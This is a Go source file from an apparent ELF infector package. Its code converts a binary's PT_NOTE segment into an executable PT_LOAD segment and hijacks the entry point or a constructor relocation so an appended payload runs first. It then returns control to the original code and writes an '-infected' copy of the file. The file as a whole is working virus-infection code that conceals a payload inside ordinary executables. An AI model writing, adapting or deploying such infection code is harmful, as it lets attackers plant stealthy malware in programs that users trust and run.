package elfinfect

import (
	"bytes"
	"debug/elf"
	"encoding/binary"
	"errors"
	"fmt"
	"io/ioutil"
)

func (t *TargetBin) PtNoteToPtLoadInfection(opts InfectOpts) error {
	var noteNdx int

	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		oEntry := t.Hdr.(*elf.Header64).Entry

		pHeaders := t.Phdrs.([]elf.Prog64)
		pNum := int(t.Hdr.(*elf.Header64).Phnum)
		numPtNote := 0

		for pHeaderNdx := 0; pHeaderNdx < pNum; pHeaderNdx++ {
			currentHeaderType := elf.ProgType(pHeaders[pHeaderNdx].Type)
			if currentHeaderType == elf.PT_NOTE {
				numPtNote++
				noteNdx = pHeaderNdx
			}
		}

		t.printDebugMsg("[+] PT_NOTE segment pHeader index @ %d\n", noteNdx)
		t.printDebugMsg("[+] Converting PT_NOTE to PT_LOAD and setting PERM R-X")

		t.Phdrs.([]elf.Prog64)[noteNdx].Type = uint32(elf.PT_LOAD)
		t.Phdrs.([]elf.Prog64)[noteNdx].Flags = uint32(elf.PF_R | elf.PF_X)
		t.Phdrs.([]elf.Prog64)[noteNdx].Vaddr = 0xc000000 + uint64(t.Filesz)
		t.Phdrs.([]elf.Prog64)[noteNdx].Off = uint64(t.Filesz)

		t.printDebugMsg("[+] Newly created PT_LOAD virtual address starts at 0x%x\n", t.Phdrs.([]elf.Prog64)[noteNdx].Vaddr)
		
		newEntry := t.Phdrs.([]elf.Prog64)[noteNdx].Vaddr

		var origAddend int64
		var relocEntry elf.Rela64
		if (opts & CtorsHijack) == CtorsHijack {
			if err := t.relativeRelocHook(&origAddend, &relocEntry, int64(newEntry)); err != nil {
				return err
			}
			
		}else {
			t.Hdr.(*elf.Header64).Entry = newEntry 
		}
		
		t.printDebugMsg("[+] Modifed entry point from 0x%x to 0x%x\n", oEntry, t.Hdr.(*elf.Header64).Entry)

		if !((opts & NoRest) == NoRest) {
			t.Payload.Write(restoration64)
		}
		
		if !((opts & NoRetOEP) == NoRetOEP) {
			var retStub []byte
			if (opts & CtorsHijack) == CtorsHijack {
				retStub = modEpilogue(int32(t.Payload.Len() + 5), uint64(relocEntry.Addend), uint64(origAddend))
			}else {
				retStub = modEpilogue(int32(t.Payload.Len() + 5), t.Hdr.(*elf.Header64).Entry, oEntry)
			}
			t.Payload.Write(retStub)
		}
		
		plen := uint64(t.Payload.Len())

		t.Phdrs.([]elf.Prog64)[noteNdx].Filesz += plen
		t.Phdrs.([]elf.Prog64)[noteNdx].Memsz += plen

		t.printDebugMsg("[+] Increased Phdr.Filesz by length of payload (0x%x)\n", plen)
		t.printDebugMsg("[+] Increased Phdr.Memsz by length of payload (0x%x)\n", plen)
		t.printDebugMsg("[+] Increased section header offset from 0x%x to 0x%x to account for payload\n", (t.Hdr.(*elf.Header64).Shoff - plen), t.Hdr.(*elf.Header64).Shoff)

	case elf.ELFCLASS32:
		return errors.New("32 bit support for this alogorithm is not implemented yet")
	}

	infected := new(bytes.Buffer)

	if h, ok := t.Hdr.(*elf.Header64); ok {
		if err := binary.Write(infected, t.EIdent.Endianness, h); err != nil {
			return err
		}
	}

	if h, ok := t.Hdr.(*elf.Header32); ok {
		if err := binary.Write(infected, t.EIdent.Endianness, h); err != nil {
			return err
		}
	}

	if p, ok := t.Phdrs.([]elf.Prog64); ok {
		if err := binary.Write(infected, t.EIdent.Endianness, p); err != nil {
			return err
		}
	}

	if p, ok := t.Phdrs.([]elf.Prog32); ok {
		if err := binary.Write(infected, t.EIdent.Endianness, p); err != nil {
			return err
		}
	}

	var ephdrsz int
	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		ephdrsz = int(t.Hdr.(*elf.Header64).Ehsize) + int(t.Hdr.(*elf.Header64).Phentsize*t.Hdr.(*elf.Header64).Phnum)
	case elf.ELFCLASS32:
		ephdrsz = int(t.Hdr.(*elf.Header32).Ehsize) + int(t.Hdr.(*elf.Header32).Phentsize*t.Hdr.(*elf.Header32).Phnum)
	}

	infected.Write(t.Contents[int(ephdrsz):])
	infected.Write(t.Payload.Bytes())

	infectedFileName := fmt.Sprintf("%s-infected", t.Fh.Name())

	if err := ioutil.WriteFile(infectedFileName, infected.Bytes(), 0751); err != nil {
		return err
	}

	return nil
}
